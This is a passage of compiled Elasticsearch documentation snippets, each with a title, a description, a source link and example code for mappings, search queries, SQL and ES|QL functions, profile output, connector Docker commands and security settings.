\"text\": \"amsterdam\" } }\n      },\n      \"ratings\": [                                              \n        { \"_index\": \"my-index-000001\", \"_id\": \"doc1\", \"rating\": 0 },\n        { \"_index\": \"my-index-000001\", \"_id\": \"doc2\", \"rating\": 3 },\n        { \"_index\": \"my-index-000001\", \"_id\": \"doc3\", \"rating\": 1 }\n      ]\n    },\n    {\n      \"id\": \"berlin_query\",\n      \"request\": {\n        \"query\": { \"match\": { \"text\": \"berlin\" } }\n      },\n      \"ratings\": [\n        { \"_index\": \"my-index-000001\", \"_id\": \"doc1\", \"rating\": 1 }\n      ]\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Using MATCH Function Syntax in Elasticsearch SQL\nDESCRIPTION: The MATCH function allows for executing match and multi_match queries against Elasticsearch. It takes field expressions, matching text, and optional parameters to control search behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nMATCH(\n    field_exp,   <1>\n    constant_exp <2>\n    [, options]) <3>\n```\n\n----------------------------------------\n\nTITLE: Creating Document with Wait-For Refresh in Elasticsearch\nDESCRIPTION: Example of creating a document with refresh=wait_for, which waits for the next refresh to occur before completing the request. This provides a balance between immediate visibility and performance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/refresh-parameter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /test/_doc/4?refresh=wait_for\n{\"test\": \"test\"}\n```\n\n----------------------------------------\n\nTITLE: Detailed Query Timing Breakdown in Elasticsearch Profile API\nDESCRIPTION: Example of the breakdown component in Profile API results which provides detailed timing statistics about low-level Lucene execution. It shows various metrics like creation time, scoring time, and document matching operations in nanoseconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_4\n\nLANGUAGE: console-result\nCODE:\n```\n\"breakdown\": {\n  \"set_min_competitive_score_count\": 0,\n  \"match_count\": 5,\n  \"shallow_advance_count\": 0,\n  \"set_min_competitive_score\": 0,\n  \"next_doc\": 39022,\n  \"match\": 4456,\n  \"next_doc_count\": 5,\n  \"score_count\": 5,\n  \"compute_max_score_count\": 0,\n  \"compute_max_score\": 0,\n  \"advance\": 84525,\n  \"advance_count\": 1,\n  \"score\": 37779,\n  \"build_scorer_count\": 2,\n  \"create_weight\": 4694895,\n  \"shallow_advance\": 0,\n  \"create_weight_count\": 1,\n  \"build_scorer\": 7112295,\n  \"count_weight\": 0,\n  \"count_weight_count\": 0\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring and Querying Null Values in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure a keyword field with a null_value, index documents with null and empty values, and query for the null_value. It showcases the difference in handling explicit null values versus empty arrays.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/null-value.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"status_code\": {\n        \"type\":       \"keyword\",\n        \"null_value\": \"NULL\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"status_code\": null\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"status_code\": []\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"term\": {\n      \"status_code\": \"NULL\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Role-based Audit Event Ignore Policy in Elasticsearch YAML\nDESCRIPTION: This setting specifies a list of role names or wildcards for which audit events will not be printed. It only applies if all of the user's roles are covered by the policy. It is a dynamic cluster setting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/auding-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.audit.logfile.events.ignore_filters.<policy_name>.roles\n```\n\n----------------------------------------\n\nTITLE: Running Docker Image for Elasticsearch Connector\nDESCRIPTION: Docker command to run the Elasticsearch Connector Service with configuration volume mount and network settings\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-dropbox.md#2025-04-21_snippet_5\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Explain Request with Script Score in Elasticsearch\nDESCRIPTION: Demonstrates how to use an explain request with a script_score query, including custom explanations in the script.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_explain/0\n{\n  \"query\": {\n    \"script_score\": {\n      \"query\": {\n        \"match\": { \"message\": \"elasticsearch\" }\n      },\n      \"script\": {\n        \"source\": \"\"\"\n          long count = doc['count'].value;\n          double normalizedCount = count / 10;\n          if (explanation != null) {\n            explanation.set('normalized count = count / 10 = ' + count + ' / 10 = ' + normalizedCount);\n          }\n          return normalizedCount;\n        \"\"\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Docker Image for Elasticsearch Connectors\nDESCRIPTION: This shell command runs a Docker image to deploy the Elastic Connector Service using a specific configuration file. The command mounts a local configuration directory, sets the Docker network, and specifies the image version. Prerequisites include Docker and access to the configuration file on the local path. The expected output is the running connector service, ready to ingest data. Ensure proper network settings in Docker.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-google-drive.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Creating a Basic Dense Vector Field in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index with a dense_vector field and insert documents with vector values. The field is configured with 3 dimensions and doesn't use any special indexing options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT my-index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"dense_vector\",\n        \"dims\": 3\n      },\n      \"my_text\" : {\n        \"type\" : \"keyword\"\n      }\n    }\n  }\n}\n\nPUT my-index/_doc/1\n{\n  \"my_text\" : \"text1\",\n  \"my_vector\" : [0.5, 10, 6]\n}\n\nPUT my-index/_doc/2\n{\n  \"my_text\" : \"text2\",\n  \"my_vector\" : [-0.5, 10, 10]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Histogram and Keyword Fields in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an Elasticsearch index with two field mappings: a histogram field for storing percentile data and a keyword field for storing text. This setup is required for the _doc_count example.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-doc-count-field.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my_index\n{\n  \"mappings\" : {\n    \"properties\" : {\n      \"my_histogram\" : {\n        \"type\" : \"histogram\"\n      },\n      \"my_text\" : {\n        \"type\" : \"keyword\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Keyed Response Date Histogram Example\nDESCRIPTION: Example query showing how to get a keyed response for date histogram aggregation with monthly intervals.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sales_over_time\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\",\n        \"format\": \"yyyy-MM-dd\",\n        \"keyed\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Inserting Data into Time Series Index in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to add data to a time series index using the _bulk API. It inserts four documents with 'key', 'val', and '@timestamp' fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-time-series-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT /my-time-series-index-0/_bulk\n{ \"index\": {} }\n{ \"key\": \"a\", \"val\": 1, \"@timestamp\": \"2022-01-01T00:00:10Z\" }\n{ \"index\": {}}\n{ \"key\": \"a\", \"val\": 2, \"@timestamp\": \"2022-01-02T00:00:00Z\" }\n{ \"index\": {} }\n{ \"key\": \"b\", \"val\": 2, \"@timestamp\": \"2022-01-01T00:00:10Z\" }\n{ \"index\": {}}\n{ \"key\": \"b\", \"val\": 3, \"@timestamp\": \"2022-01-02T00:00:00Z\" }\n```\n\n----------------------------------------\n\nTITLE: Executing a Search Query with Unified Highlighter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to perform a search query with a highlight request using the unified highlighter in Elasticsearch. It searches for the phrase 'only fox' and requests up to 3 highlighted fragments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_31\n\nLANGUAGE: json\nCODE:\n```\nGET test_index/_search\n{\n  \"query\": {\n    \"match_phrase\" : {\"content\" : \"only fox\"}\n  },\n  \"highlight\": {\n    \"type\" : \"unified\",\n    \"number_of_fragments\" : 3,\n    \"fields\": {\n      \"content\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: PEM Certificate Configuration Settings\nDESCRIPTION: Settings for configuring PEM-encoded certificates and private keys for transport layer security.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_27\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.transport.ssl.key=/path/to/private.key\nxpack.security.transport.ssl.key_passphrase=keypassword\nxpack.security.transport.ssl.secure_key_passphrase=securepassword\nxpack.security.transport.ssl.certificate=/path/to/certificate.pem\nxpack.security.transport.ssl.certificate_authorities=/path/to/ca.pem\n```\n\n----------------------------------------\n\nTITLE: Custom GROK Pattern Example\nDESCRIPTION: Shows how to create a custom GROK pattern using Oniguruma syntax for named capture.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_12\n\nLANGUAGE: txt\nCODE:\n```\n(?<queue_id>[0-9A-F]{10,11})\n```\n\n----------------------------------------\n\nTITLE: Completion Suggester with Source Filtering in Elasticsearch\nDESCRIPTION: Demonstrates how to use source filtering with completion suggesters to minimize response size by returning only specific fields from the source document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nPOST music/_search\n{\n  \"_source\": \"suggest\",     <1>\n  \"suggest\": {\n    \"song-suggest\": {\n      \"prefix\": \"nir\",\n      \"completion\": {\n        \"field\": \"suggest\", <2>\n        \"size\": 5           <3>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing Datetime Strings in SQL\nDESCRIPTION: The DATETIME_PARSE function parses a datetime string using a specified format pattern. It requires both date and time components and returns a datetime value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_46\n\nLANGUAGE: sql\nCODE:\n```\nDATETIME_PARSE(\n    string_exp, <1>\n    string_exp) <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATETIME_PARSE('07/04/2020 10:20:30.123', 'dd/MM/yyyy HH:mm:ss.SSS') AS \"datetime\";\n\n      datetime\n------------------------\n2020-04-07T10:20:30.123Z\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DATETIME_PARSE('10:20:30 07/04/2020 Europe/Berlin', 'HH:mm:ss dd/MM/yyyy VV') AS \"datetime\";\n\n      datetime\n------------------------\n2020-04-07T08:20:30.000Z\n```\n\n----------------------------------------\n\nTITLE: Using Named Queries in RRF Elasticsearch Search\nDESCRIPTION: Elasticsearch query that demonstrates using named queries with RRF to provide more intuitive explanation output. This example shows how to use the _name parameter with knn retriever.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_10\n\nLANGUAGE: js\nCODE:\n```\nGET example-index/_search\n{\n    \"retriever\": {\n        \"rrf\": {\n            \"retrievers\": [\n                {\n                    \"standard\": {\n                        \"query\": {\n                            \"term\": {\n                                \"text\": \"rrf\"\n                            }\n                        }\n                    }\n                },\n                {\n                    \"knn\": {\n                        \"field\": \"vector\",\n                        \"query_vector\": [3],\n                        \"k\": 5,\n                        \"num_candidates\": 5,\n                        \"_name\": \"my_knn_query\"                           <1>\n                    }\n                }\n            ],\n            \"rank_window_size\": 5,\n            \"rank_constant\": 1\n        }\n    },\n    \"size\": 3,\n    \"aggs\": {\n        \"int_count\": {\n            \"terms\": {\n                \"field\": \"integer\"\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling the _size Field in Elasticsearch Mapping\nDESCRIPTION: This snippet shows how to enable the _size field by setting it in the index mapping. The _size field must be explicitly enabled to track document sizes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-size-usage.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"_size\": {\n      \"enabled\": true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Custom Similarity to Field Mapping in Elasticsearch\nDESCRIPTION: Demonstrates how to apply a previously configured custom similarity to a specific text field in the mapping. The example shows mapping the 'title' field to use the custom similarity named 'my_similarity'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/similarity.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /index/_mapping\n{\n  \"properties\" : {\n    \"title\" : { \"type\" : \"text\", \"similarity\" : \"my_similarity\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Complex Inference Aggregation Example with Web Log Analysis\nDESCRIPTION: Shows a complete example of using inference aggregation to analyze web logs, including composite aggregation by client IP and various metrics calculations for identifying suspicious IPs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-inference-bucket-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET kibana_sample_data_logs/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"client_ip\": {\n      \"composite\": {\n        \"sources\": [\n          {\n            \"client_ip\": {\n              \"terms\": {\n                \"field\": \"clientip\"\n              }\n            }\n          }\n        ]\n      },\n      \"aggs\": {\n        \"url_dc\": {\n          \"cardinality\": {\n            \"field\": \"url.keyword\"\n          }\n        },\n        \"bytes_sum\": {\n          \"sum\": {\n            \"field\": \"bytes\"\n          }\n        },\n        \"geo_src_dc\": {\n          \"cardinality\": {\n            \"field\": \"geo.src\"\n          }\n        },\n        \"geo_dest_dc\": {\n          \"cardinality\": {\n            \"field\": \"geo.dest\"\n          }\n        },\n        \"responses_total\": {\n          \"value_count\": {\n            \"field\": \"timestamp\"\n          }\n        },\n        \"success\": {\n          \"filter\": {\n            \"term\": {\n              \"response\": \"200\"\n            }\n          }\n        },\n        \"error404\": {\n          \"filter\": {\n            \"term\": {\n              \"response\": \"404\"\n            }\n          }\n        },\n        \"error503\": {\n          \"filter\": {\n            \"term\": {\n              \"response\": \"503\"\n            }\n          }\n        },\n        \"malicious_client_ip\": {\n          \"inference\": {\n            \"model_id\": \"malicious_clients_model\",\n            \"buckets_path\": {\n              \"response_count\": \"responses_total\",\n              \"url_dc\": \"url_dc\",\n              \"bytes_sum\": \"bytes_sum\",\n              \"geo_src_dc\": \"geo_src_dc\",\n              \"geo_dest_dc\": \"geo_dest_dc\",\n              \"success\": \"success._count\",\n              \"error404\": \"error404._count\",\n              \"error503\": \"error503._count\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing CJK Bigram Token Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to customize the CJK bigram token filter by creating a new custom token filter with specific configuration parameters, including ignored scripts and unigram output settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-cjk-bigram-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /cjk_bigram_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"han_bigrams\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"han_bigrams_filter\" ]\n        }\n      },\n      \"filter\": {\n        \"han_bigrams_filter\": {\n          \"type\": \"cjk_bigram\",\n          \"ignored_scripts\": [\n            \"hangul\",\n            \"hiragana\",\n            \"katakana\"\n          ],\n          \"output_unigrams\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Highlighted Fragments in Elasticsearch Query\nDESCRIPTION: This snippet demonstrates how to control the size and number of highlighted fragments in an Elasticsearch search query. It specifies a fragment size of 150 characters and limits the number of fragments to 3 for the 'comment' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_19\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\" : {\n    \"match\": { \"user.id\": \"kimchy\" }\n  },\n  \"highlight\" : {\n    \"fields\" : {\n      \"comment\" : {\"fragment_size\" : 150, \"number_of_fragments\" : 3}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: DISSECT Complex Right Padding\nDESCRIPTION: Demonstrates using right padding with bracketed values and empty keys\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_5\n\nLANGUAGE: esql\nCODE:\n```\nROW message=\"[1998-08-10T17:15:42]          [WARN]\"\n| DISSECT message \"\"\"[%{ts}]%{->}[%{level}]\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Calculating Time Difference in Microseconds using DATE_DIFF in ESQL\nDESCRIPTION: This snippet demonstrates how to use the DATE_DIFF function to calculate the difference between two timestamps in microseconds. It creates two datetime values and then computes their difference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/date_diff.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW date1 = TO_DATETIME(\"2023-12-02T11:00:00.000Z\"),\n    date2 = TO_DATETIME(\"2023-12-02T11:00:00.001Z\")\n| EVAL dd_ms = DATE_DIFF(\"microseconds\", date1, date2)\n```\n\n----------------------------------------\n\nTITLE: Parsing DateTime from Milliseconds\nDESCRIPTION: Demonstrates converting a millisecond string to a ZonedDateTime object via Instant conversion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nString milliSinceEpochString = \"434931330000\";\nlong milliSinceEpoch = Long.parseLong(milliSinceEpochString);\nInstant instant = Instant.ofEpochMilli(milliSinceEpoch);\nZonedDateTime zdt = ZonedDateTime.ofInstant(instant, ZoneId.of('Z'));\n```\n\n----------------------------------------\n\nTITLE: LIKE Operator Syntax in Elasticsearch SQL\nDESCRIPTION: Shows the basic syntax for the LIKE operator in Elasticsearch SQL. The left side is typically a field or constant expression, while the right side is the pattern with wildcards (% for zero or more characters, _ for a single character).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-like-rlike-operators.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nexpression        <1>\nLIKE constant_exp <2>\n```\n\n----------------------------------------\n\nTITLE: Configuring User Agent Processor Pipeline in Elasticsearch\nDESCRIPTION: Example showing how to set up a pipeline that processes user agent strings and extracts browser information. The example demonstrates creating a pipeline and indexing a document with a user agent string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/user-agent-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/user_agent\n{\n  \"description\" : \"Add user agent information\",\n  \"processors\" : [\n    {\n      \"user_agent\" : {\n        \"field\" : \"agent\"\n      }\n    }\n  ]\n}\nPUT my-index-000001/_doc/my_id?pipeline=user_agent\n{\n  \"agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"\n}\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Defining Latvian Stop Words\nDESCRIPTION: Specifies the Latvian stop words for use in Elasticsearch text analysis, with links to the relevant Lucene file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_27\n\nLANGUAGE: markdown\nCODE:\n```\n`_latvian_`\n:   [Latvian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/lv/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Profile API Response Structure in Elasticsearch\nDESCRIPTION: Example response from the Profile API showing detailed timing information for a search query. The response includes metrics for query execution, breakdown of time spent in different operations, and fetch phase details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 25,\n  \"timed_out\": false,\n  \"_shards\": {\n    \"total\": 1,\n    \"successful\": 1,\n    \"skipped\": 0,\n    \"failed\": 0\n  },\n  \"hits\": {\n    \"total\": {\n      \"value\": 5,\n      \"relation\": \"eq\"\n    },\n    \"max_score\": 0.17402273,\n    \"hits\": [...] <1>\n  },\n  \"profile\": {\n    \"shards\": [\n      {\n        \"id\": \"[q2aE02wS1R8qQFnYu6vDVQ][my-index-000001][0]\",\n        \"node_id\": \"q2aE02wS1R8qQFnYu6vDVQ\",\n        \"shard_id\": 0,\n        \"index\": \"my-index-000001\",\n        \"cluster\": \"(local)\",\n        \"searches\": [\n          {\n            \"query\": [\n              {\n                \"type\": \"BooleanQuery\",\n                \"description\": \"message:get message:search\",\n                \"time_in_nanos\" : 11972972,\n                \"breakdown\" : {\n                  \"set_min_competitive_score_count\": 0,\n                  \"match_count\": 5,\n                  \"shallow_advance_count\": 0,\n                  \"set_min_competitive_score\": 0,\n                  \"next_doc\": 39022,\n                  \"match\": 4456,\n                  \"next_doc_count\": 5,\n                  \"score_count\": 5,\n                  \"compute_max_score_count\": 0,\n                  \"compute_max_score\": 0,\n                  \"advance\": 84525,\n                  \"advance_count\": 1,\n                  \"score\": 37779,\n                  \"build_scorer_count\": 2,\n                  \"create_weight\": 4694895,\n                  \"shallow_advance\": 0,\n                  \"create_weight_count\": 1,\n                  \"build_scorer\": 7112295,\n                  \"count_weight\": 0,\n                  \"count_weight_count\": 0\n                },\n                \"children\": [\n                  {\n                    \"type\": \"TermQuery\",\n                    \"description\": \"message:get\",\n                    \"time_in_nanos\": 3801935,\n                    \"breakdown\": {\n                      \"set_min_competitive_score_count\": 0,\n                      \"match_count\": 0,\n                      \"shallow_advance_count\": 3,\n                      \"set_min_competitive_score\": 0,\n                      \"next_doc\": 0,\n                      \"match\": 0,\n                      \"next_doc_count\": 0,\n                      \"score_count\": 5,\n                      \"compute_max_score_count\": 3,\n                      \"compute_max_score\": 32487,\n                      \"advance\": 5749,\n                      \"advance_count\": 6,\n                      \"score\": 16219,\n                      \"build_scorer_count\": 3,\n                      \"create_weight\": 2382719,\n                      \"shallow_advance\": 9754,\n                      \"create_weight_count\": 1,\n                      \"build_scorer\": 1355007,\n                      \"count_weight\": 0,\n                      \"count_weight_count\": 0\n                    }\n                  },\n                  {\n                    \"type\": \"TermQuery\",\n                    \"description\": \"message:search\",\n                    \"time_in_nanos\": 205654,\n                    \"breakdown\": {\n                      \"set_min_competitive_score_count\": 0,\n                      \"match_count\": 0,\n                      \"shallow_advance_count\": 3,\n                      \"set_min_competitive_score\": 0,\n                      \"next_doc\": 0,\n                      \"match\": 0,\n                      \"next_doc_count\": 0,\n                      \"score_count\": 5,\n                      \"compute_max_score_count\": 3,\n                      \"compute_max_score\": 6678,\n                      \"advance\": 12733,\n                      \"advance_count\": 6,\n                      \"score\": 6627,\n                      \"build_scorer_count\": 3,\n                      \"create_weight\": 130951,\n                      \"shallow_advance\": 2512,\n                      \"create_weight_count\": 1,\n                      \"build_scorer\": 46153,\n                      \"count_weight\": 0,\n                      \"count_weight_count\": 0\n                    }\n                  }\n                ]\n              }\n            ],\n            \"rewrite_time\": 451233,\n            \"collector\": [\n              {\n                \"name\": \"QueryPhaseCollector\",\n                \"reason\": \"search_query_phase\",\n                \"time_in_nanos\": 775274,\n                \"children\" : [\n                  {\n                    \"name\": \"SimpleTopScoreDocCollector\",\n                    \"reason\": \"search_top_hits\",\n                    \"time_in_nanos\": 775274\n                  }\n                ]\n              }\n            ]\n          }\n        ],\n        \"aggregations\": [],\n        \"fetch\": {\n          \"type\": \"fetch\",\n          \"description\": \"\",\n          \"time_in_nanos\": 660555,\n          \"breakdown\": {\n            \"next_reader\": 7292,\n            \"next_reader_count\": 1,\n            \"load_stored_fields\": 299325,\n            \"load_stored_fields_count\": 5,\n            \"load_source\": 3863,\n            \"load_source_count\": 5\n          },\n          \"debug\": {\n            \"stored_fields\": [\"_id\", \"_routing\", \"_source\"]\n          },\n          \"children\": [\n            {\n              \"type\" : \"FetchFieldsPhase\",\n              \"description\" : \"\",\n              \"time_in_nanos\" : 238762,\n              \"breakdown\" : {\n                \"process_count\" : 5,\n                \"process\" : 227914,\n                \"next_reader\" : 10848,\n                \"next_reader_count\" : 1\n              }\n            },\n            {\n              \"type\": \"FetchSourcePhase\",\n              \"description\": \"\",\n              \"time_in_nanos\": 20443,\n              \"breakdown\": {\n                \"next_reader\": 745,\n                \"next_reader_count\": 1,\n                \"process\": 19698,\n                \"process_count\": 5\n              },\n              \"debug\": {\n                \"fast_path\": 5\n              }\n            },\n            {\n              \"type\": \"StoredFieldsPhase\",\n              \"description\": \"\",\n              \"time_in_nanos\": 5310,\n              \"breakdown\": {\n                \"next_reader\": 745,\n                \"next_reader_count\": 1,\n                \"process\": 4445,\n                \"process_count\": 5\n              }\n            }\n          ]\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Truncating Buckets Without Sorting in Elasticsearch\nDESCRIPTION: Demonstrates how to use bucket sort aggregation to truncate result buckets without performing any sorting, returning only the second bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-bucket-sort-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"bucket_truncate\": {\n          \"bucket_sort\": {\n            \"from\": 1,\n            \"size\": 1\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CEIL/CEILING Function in Elasticsearch SQL\nDESCRIPTION: Returns the smallest integer greater than or equal to the input numeric expression. The function takes a numeric input and returns an integer or long value. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nCEIL(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Documents Using _tier Field\nDESCRIPTION: Example showing how to query documents across multiple indexes using the _tier field to filter by data tiers. The query uses terms to match documents in indexes with tier_preference set to either data_hot or data_warm.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-tier-field.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT index_1/_doc/1\n{\n  \"text\": \"Document in index 1\"\n}\n\nPUT index_2/_doc/2?refresh=true\n{\n  \"text\": \"Document in index 2\"\n}\n\nGET index_1,index_2/_search\n{\n  \"query\": {\n    \"terms\": {\n      \"_tier\": [\"data_hot\", \"data_warm\"]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating API Key for Outlook Connector\nDESCRIPTION: This snippet shows how to create an API key for the Outlook connector using the Elasticsearch API. It defines the key name and role descriptors with necessary permissions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-outlook.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            